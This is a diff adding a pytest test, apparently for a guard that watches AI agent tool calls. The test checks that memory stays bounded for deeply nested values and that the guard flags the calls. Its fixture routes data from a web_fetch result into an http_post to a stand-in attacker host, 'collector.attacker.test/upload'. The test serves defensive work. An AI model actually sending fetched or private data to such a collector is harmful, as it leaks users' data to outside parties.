@@ -341,3 +341,49 @@ def test_a_bound_block_tells_telemetry_which_bound():
     assert len(vo_events) == 1, vo_events
     assert vo_events[0].get("valueOrigin") == "result_unread", (
         f"the block event does not say which state blocked it: {vo_events[0]}")
+
+
+# ── memory on deep nesting ───────────────────────────────────────────────────
+# The work budget that bounds time bounds memory too: a value nested thousands
+# deep costs memory in proportion to the work spent on it, never to the square
+# of its depth. Measured with tracemalloc around the call alone; the nested value
+# is built before tracing starts.
+_DEEP_BOUND = 8 * 1024 * 1024
+
+
+def _nested(depth, kind):
+    x = "https://collector.attacker.test/upload"
+    for _ in range(depth):
+        x = {"k": x} if kind == "dict" else [x]
+    return x
+
+
+@pytest.mark.parametrize("side", ["argument", "result"])
+@pytest.mark.parametrize("kind", ["dict", "list"])
+@pytest.mark.parametrize("depth", [1_000, 2_000, 4_000, 8_000, 16_000])
+def test_memory_stays_bounded_at_every_nesting_depth(depth, kind, side):
+    import gc
+    import tracemalloc
+    value = _nested(depth, kind)
+    gc.collect()
+    vo.bind_fresh_ledger()
+    tracemalloc.start()
+    try:
+        if side == "result":
+            vo.record_tool_result("web_fetch", {"q": "x"}, value, designations=(),
+                                  result_blocked=False)
+            v = vo.evaluate_call("http_post", {"url": "https://collector.attacker.test/upload"},
+                                 flow_active=True)
+        else:
+            v = vo.evaluate_call("http_post", {"body": value}, flow_active=True)
+        peak = tracemalloc.get_traced_memory()[1]
+    finally:
+        tracemalloc.stop()
+        vo.unbind_ledger()
+    assert peak < _DEEP_BOUND, (
+        f"a {kind} nested {depth} deep as {'an argument' if side == 'argument' else 'a result'} "
+        f"peaked at {peak / 2**20:.1f} MiB "
+        f"(bound {_DEEP_BOUND / 2**20:.0f} MiB): memory grows with depth, not with the "
+        "work budget")
+    assert v.wire.value in ("untrusted_source", "argument_bound", "extraction_incomplete"), (
+        v.wire.value)
